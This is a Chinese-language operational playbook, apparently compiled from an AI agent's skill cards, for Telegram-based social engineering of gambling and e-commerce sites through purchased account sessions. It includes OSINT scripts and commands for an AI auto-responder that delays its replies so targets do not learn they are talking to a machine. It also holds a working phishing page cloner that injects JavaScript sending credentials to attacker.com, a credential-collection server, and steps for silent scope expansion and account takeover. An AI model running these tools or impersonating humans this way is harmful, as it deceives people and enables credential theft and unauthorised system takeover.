---
title: "TG号库投递与社工推进手法.md"
generated: 2026-10-21
kind: consolidated-playbook
note: 由现役技能卡自动汇总；保留原卡语义，未改写攻防步骤
---

# TG号库投递与社工推进手法.md

> 本页由引用该路径的现役技能卡汇总生成。原始内容与完整步骤见下方来源卡；不要把它当成独立的新打法。

## 来源卡

- `/root/.hermes/skills/security/autonomous-social-engagement/SKILL.md`
- `/root/.hermes/skills/security/tg-account-library/SKILL.md`
- `/root/.hermes/skills/security/autonomous-social-engagement/references/full.md`

## 汇总内容

### autonomous-social-engagement

来源：`/root/.hermes/skills/security/autonomous-social-engagement/SKILL.md`

# 自主社工 / 代理推进

**前提**：技术面 1–6 已穷尽，且至少有一类入场券（session / 客服 TG / 既有对话 / 前端泄露对接人）。

旧名 `tg-social-engage` 已并入本卡。

---

## 关联 Skill & Playbook

| 方向 | 名称 | 说明 |
|------|------|------|
| 上游 | `case-triage` | 案卷定级（确认技术面已穷尽） |
| 上游 | `strike-probe` | S1-S8 黑盒突击（先打完技术面） |
| 上游 | `auth-brute` | 登录爆破已穷尽 |
| 平行 | `tg-bot-webhook-hijack` | TG Bot Token 接管（非社工路径） |
| 平行 | `tg-cloud-panel` | TG 云控面板渗透 |
| 平行 | `tg-number-admin-pentest` | TG 号码管理后台 |
| 平行 | `browser-automation` | 自动化浏览器操作 |
| 下游 | `account-takeover-chain` | 社工获取凭据后 ATO |
| 下游 | `credential-harvest` | 凭据收割 |
| 下游 | `session-pipeline` | 会员 session 导入 |
| 工具 | `tools/ops/social_engineer_agent.py` | 社工代理自动化 |
| 工具 | `tools/ops/tg_social_monitor.py` | TG 消息监控/自动回复 |
| Playbook | `docs/playbooks/TG号库投递与社工推进手法.md` | TG 投递真源 |
| Playbook | `docs/playbooks/博彩站代理社工+后台接管杀伤链.md` | 代理社工杀伤链 |
| 参考 | `docs/learning/extended-pack/skills/autonomous-social-engagement/SKILL.md` | 扩展包原版 |
| 参考 | `docs/learning/hypothesis-pack/techniques/social-engineering.md` | 假设包社工技术 |

---

## 成功口径

| 档 | 成立条件 | 不算 |
|----|----------|------|
| **L1** | 成功建立联系（客服/招商回复且进入对话） | 只发了消息没收到回复 |
| **L1b** | 收集到目标内部信息（后台 URL / 登录方式 / 技术栈线索） | 只拿到公开信息 |
| **L2** | 获取到有效凭据（账号密码 / 后台地址 + 登录方式 / 邀请链接）| 凭据无效或已过期 |
| **L2b** | 以代理身份成功注册并进入代理后台 | 注册未通过审核 |
| **L3** | 通过社工获取的凭据/访问接管目标系统 | 只进入无权限的空面板 |

---

## 强制行为

1. **技术面必须先穷尽**：至少跑完 `strike_probe` S1–S8 + 专卡后才转社工
2. **必须有入场券**：session / 客服 TG / 对话记录 / 前端泄露对接人
3. 未进 scope 不社工
4. 用户说「停」立刻停
5. **号库路径**：`exports/bot-recovery/_tg_accounts/`（不要 `/opt/data`）
6. 不发真实恶意链接给非授权目标
7. 社工进度必须记录到 `STATUS.md`
8. **人设一致性**：同一条线保持同一人设，不在中途切换身份

---

## Phase 0: 信息收集与入场券确认

### 命令 0-1: 目标社工面情报收集

```python
#!/usr/bin/env python3
"""目标社工面情报收集（从案卷和公开信息中提取社工入口）"""
import os, re, json, sys

CASE_DIR = sys.argv[1] if len(sys.argv) > 1 else "exports/bot-recovery/<案卷>"

print("=== 社工入口扫描 ===")

# 从已有案卷中提取 TG 线索
tg_patterns = [
    (r't\.me/(\w+)', 'TG 用户/频道'),
    (r'@(\w{5,})', 'TG @username'),
    (r'tg://resolve\?domain=(\w+)', 'TG deeplink'),
    (r'telegram\.me/(\w+)', 'TG 链接'),
]

# 从 STATUS / REPORT 中搜索
for root, dirs, files in os.walk(CASE_DIR):
    for f in files:
        if not f.endswith(('.md', '.txt', '.json', '.html')):
            continue
        path = os.path.join(root, f)
        try:
            content = open(path, 'r', errors='replace').read()
        except:
            continue
        for pat, desc in tg_patterns:
            for m in re.finditer(pat, content):
                print(f"  {desc}: {m.group(0)} ← {os.path.basename(path)}")

# 常见社工入口
print("\n=== 常见社工入口检查清单 ===")
checklist = [
    "网站页脚/关于页 TG 客服链接",
    "网站在线客服（LiveChat / Zendesk / Tawk.to）",
    "邮箱（support@ / admin@ / contact@）",
    "WhatsApp / LINE / 微信客服",
    "代理注册页面（/agent / /register?type=agent）",
    "招商页面（/partner / /affiliate）",
    "前端 JS 中的 TG Bot Token / Webhook URL",
    "Android APP 内嵌客服链接",
    "社交媒体主页（Facebook / Twitter / Instagram）",
]
for item in checklist:
    print(f"  □ {item}")
```

### 命令 0-2: TG 账号库状态检查

```bash
# 检查可用 TG 号
python3 tools/ops/tg_social_monitor.py list-accounts

# 检查号库
ls -la exports/bot-recovery/_tg_accounts/*.session 2>/dev/null | wc -l
echo "可用 session 数量"
```

### 命令 0-3: 目标 TG 信息采集

```python
#!/usr/bin/env python3
"""TG 目标信息采集（用户名/群/频道 OSINT）"""
import requests, sys, json

TARGET_USERNAME = sys.argv[1] if len(sys.argv) > 1 else "target_user"

# 通过 t.me 公开页面采集
url = f"https://t.me/{TARGET_USERNAME}"
r = requests.get(url, timeout=10)
if r.status_code == 200:
    import re
    # 提取公开信息
    name = re.search(r'<meta property="og:title" content="([^"]+)"', r.text)
    desc = re.search(r'<meta property="og:description" content="([^"]+)"', r.text)
    img = re.search(r'<meta property="og:image" content="([^"]+)"', r.text)
    members = re.search(r'(\d[\d\s]*) (members|subscribers)', r.text)

    print(f"Username: @{TARGET_USERNAME}")
    if name: print(f"Name: {name.group(1)}")
    if desc: print(f"Description: {desc.group(1)[:200]}")
    if img: print(f"Avatar: {img.group(1)}")
    if members: print(f"Members: {members.group(1)}")

    # 判断类型
    if 'tgme_page_action' in r.text:
        if 'Send Message' in r.text:
            print("Type: User/Bot (可私聊)")
        elif 'View in Telegram' in r.text:
            print("Type: Group/Channel")
        elif 'Join' in r.text:
            print("Type: Public Group (可加入)")
else:
    print(f"HTTP {r.status_code} — 用户名不存在或已设隐私")
```

---

## Phase 1: 人设构建

### 话术模板库

#### 模板 1: 代理招商咨询（博彩/电商场景）

```text
--- 人设 ---
身份: 有经验的

…（截断，全文见来源卡）

### tg-account-library

来源：`/root/.hermes/skills/security/tg-account-library/SKILL.md`

# TG 号库 + 社工推进（Cursor Skill）

**共同真源**：`docs/playbooks/TG号库投递与社工推进手法.md`

---

## § A · 号库管理

**扩展真源**：
- `docs/learning/extended-pack/skills/tg-account-session-intake/SKILL.md`
- `docs/learning/extended-pack/skills/tg-account-library-ops/SKILL.md`
- `tools/ops/tg_account_lib.py`

**根目录**：`exports/bot-recovery/_tg_accounts/`（不要写 `/opt/data`）

```bash
# 入库
python3 tools/ops/tg_account_lib.py intake <用户丢的zip或目录> --batch <批次>

# 盘点
python3 tools/ops/tg_account_lib.py scan

# 清库（先预览，KEEP 必须是完整手机号）
python3 tools/ops/tg_account_lib.py purge --cc 51 --keep-file keep.txt
python3 tools/ops/tg_account_lib.py selftest
python3 tools/ops/tg_account_lib.py purge --cc 51 --keep-file keep.txt --apply
```

**强制原则**：
- 阶段①只验活+dump；点 bot / 登平台等用户再说
- 用户说「停」立刻停
- 同号新 session 覆盖**所有**镜像
- 不按纯数字文件名删 js/sqlite
- 摘要写 `INDEX.json` / 案卷 STATUS，不写 Hermes MEMORY

---

## § B · 社工/代理推进

**前提**：技术面已穷尽，且有社工入场券（session / 客服 TG / 已有对话 / 前端泄露对接人）

**扩展真源**：
- `docs/learning/extended-pack/skills/autonomous-social-engagement/SKILL.md`
- `docs/playbooks/博彩站代理社工+后台接管杀伤链.md`
- `tools/ops/social_engineer_agent.py`
- `tools/ops/tg_social_monitor.py`

```bash
# 第一步：生成身份和话术
python3 tools/ops/social_engineer_agent.py run -d <授权域> --goal agent_url

# 第二步：列出号库可用账号
python3 tools/ops/tg_social_monitor.py list-accounts

# 第三步：启动监听 + AI 自动回复（延迟 45–240s 模拟人工）
python3 tools/ops/tg_social_monitor.py run \
 --phone <手机号> \
 --target @<客服TG> \
 --identity usdt_exchanger \
 --goal agent_url \
 --case <案卷名>

# 干跑（不确定回复时先看 AI 建议）
python3 tools/ops/tg_social_monitor.py run ... --dry-run

# 查看进展
python3 tools/ops/tg_social_monitor.py status --case <案卷名>
```

**强制原则**：
- 无入场券 → 如实报「社工不可行」，不空转
- 人设固定；不重复刷；对方说明天就停；凌晨不发
- 不设 delay-min=0（必须有人工延迟，防止暴露是机器）
- 技术面没打完就转社工 → 禁止
- 骚扰 scope 外第三人 → 禁止

**目标**：拿到代理后台 URL / 加白 / 报表入口 → 立刻 `scope_expand`（主站链）+ 交 `agent-probe` 
命中邀请码/pid → 工具自动写证据到 `接管/代理后台/social_eng_hit.txt`

状态自动落 `exports/bot-recovery/<案卷>/测绘/social_monitor_state.json`（每线 max_id）

---

## 衔接

- `gAAAAA` 密文 → `fernet-session-decrypt`
- 云控面板出号 → `tg-cloud-panel`
- 拿到代理后台链接 → `scope_expand` 静默扩权 + `agent-probe`

## FMT30 交割登录坑（10-12B 增补）

- 目录规范：`<phone>/<phone>.json + <phone>.session` 成对；校验 auth_key ≥32B
- **登录坑**：`session_str` 字段非法 → 必须用同目录 `.session` 文件 + `jdata['app_id']/['app_hash']` 构造 TelegramClient
- 存活率与 app_id 相关：app_id=2040 几乎全活；app_id=8 高失效（过期/踢下线，非文件坏）
- **禁混算口径**：MQTT 池 / clonebots 画像 / 社媒库不得计入交割数；交割前全量活检→`alive_phones.txt`；活体≠未被挤号
- 抽检外推基线：n=55 → OK 60% → 外推（宽区间 612-948），最终库存须全量活检

### references

来源：`/root/.hermes/skills/security/autonomous-social-engagement/references/full.md`

# autonomous-social-engagement — 全文续篇

> 主卡保留前 7 节；本文件从第 8 节起。原文件：`/root/.hermes/skills/security/autonomous-social-engagement/SKILL.md`

## Phase 4: 钓鱼链构造

### 命令 4-1: 钓鱼页面生成（登录克隆）

```python
#!/usr/bin/env python3
"""快速克隆目标登录页为钓鱼页（仅授权目标）"""
import requests, re, sys, os
from urllib.parse import urljoin

TARGET_LOGIN = sys.argv[1] if len(sys.argv) > 1 else "https://example.com/login"
OUTPUT_DIR = sys.argv[2] if len(sys.argv) > 2 else "/tmp/phish_page"
COLLECT_URL = sys.argv[3] if len(sys.argv) > 3 else "https://attacker.com/collect"

os.makedirs(OUTPUT_DIR, exist_ok=True)

s = requests.Session()
s.verify = False
r = s.get(TARGET_LOGIN)

html = r.text

# 替换 form action 为收集服务器
html = re.sub(
    r'(<form[^>]*action=)["\']([^"\']*)["\']',
    f'\\1"{COLLECT_URL}"',
    html
)

# 保持原始 CSS/JS 的绝对路径
for tag in ['href', 'src', 'action']:
    html = re.sub(
        rf'({tag}=")(/[^"]*")',
        lambda m: m.group(1) + urljoin(TARGET_LOGIN, m.group(2).rstrip('"')) + '"',
        html
    )

# 添加凭据收集 JS
collect_js = f"""
<script>
document.querySelectorAll('form').forEach(form => {{
  form.addEventListener('submit', function(e) {{
    e.preventDefault();
    const data = new FormData(form);
    const obj = {{}};
    data.forEach((v, k) => obj[k] = v);
    obj._ts = Date.now();
    obj._ref = document.referrer;
    fetch('{COLLECT_URL}', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify(obj)
    }}).then(() => {{
      window.location.href = '{TARGET_LOGIN}';
    }});
  }});
}});
</script>
"""
html = html.replace('</body>', collect_js + '</body>')

with open(os.path.join(OUTPUT_DIR, 'index.html'), 'w') as f:
    f.write(html)

print(f"Phishing page saved to {OUTPUT_DIR}/index.html")
print(f"Collect URL: {COLLECT_URL}")
print(f"Original: {TARGET_LOGIN}")
```

### 命令 4-2: 凭据收集服务器

```python
#!/usr/bin/env python3
"""轻量凭据收集服务器（社工钓鱼配套）"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, datetime, sys, os

LOG_FILE = sys.argv[1] if len(sys.argv) > 1 else "phish_creds.jsonl"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8443

class CollectHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', 'replace')

        entry = {
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "path": self.path,
            "ip": self.client_address[0],
            "ua": self.headers.get('User-Agent', ''),
            "referer": self.headers.get('Referer', ''),
            "body": body[:2000],
        }

        try:
            entry["parsed"] = json.loads(body)
        except:
            pass

        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(entry, ensure_ascii=False) + '\n')

        print(f"[{entry['timestamp']}] Credential captured from {entry['ip']}")
        if 'parsed' in entry:
            for k, v in entry['parsed'].items():
                if any(kw in k.lower() for kw in ['user','pass','email','phone','token']):
                    print(f"  ⚠️  {k}: {v}")

        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"ok":true}')

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def log_message(self, format, *args):
        pass

print(f"Collect server on :{PORT}, logging to {LOG_FILE}")
HTTPServer(('0.0.0.0', PORT), CollectHandler).serve_forever()
```

---

## Phase 5: 完整社工链（信息收集 → 初始访问）

### 流程图

```
┌─────────────────┐
│  Phase 0: OSINT │ ← 从案卷/公开信息提取社工入口
│  TG/邮箱/客服   │
└────────┬────────┘
         │
┌────────▼────────┐
│  Phase 1: 人设  │ ← 选择话术模板，准备 TG 号
│  构建与准备     │
└────────┬────────┘
         │
┌────────▼────────┐
│  Phase 2: 初始  │ ← 首次联系，建立信任
│  接触           │
└────────┬────────┘
         │ 回复？
    ┌────┴────┐
    │ Yes     │ No → 换号/换入口/升级话术
    │         │
┌───▼───┐    │
│Phase 3│    │
│信息提 │    │
│取     │    │
└───┬───┘    │
    │         │
┌───▼────────▼──┐
│  Phase 4: 目标│ ← 获取后台URL/凭据/注册链接
│  达成/钓鱼    │
└───────┬───────┘
        │
┌───────▼───────┐
│  Phase 5: 接管│ ← 使用凭据登录/注册代理
│  验证         │

…（截断，全文见来源卡）
